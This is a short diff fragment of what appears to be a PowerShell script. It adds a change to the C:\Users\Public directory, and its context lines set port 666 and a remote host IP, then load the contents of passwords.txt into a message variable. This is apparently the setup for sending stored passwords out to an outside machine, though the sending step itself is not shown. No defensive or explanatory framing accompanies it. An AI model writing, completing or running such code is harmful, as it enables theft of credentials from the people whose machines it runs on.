@@ -1,3 +1,4 @@
+cd C:\Users\Public
 $port=666
 $remoteHost = "209.151.149.234"
 $message = type passwords.txt
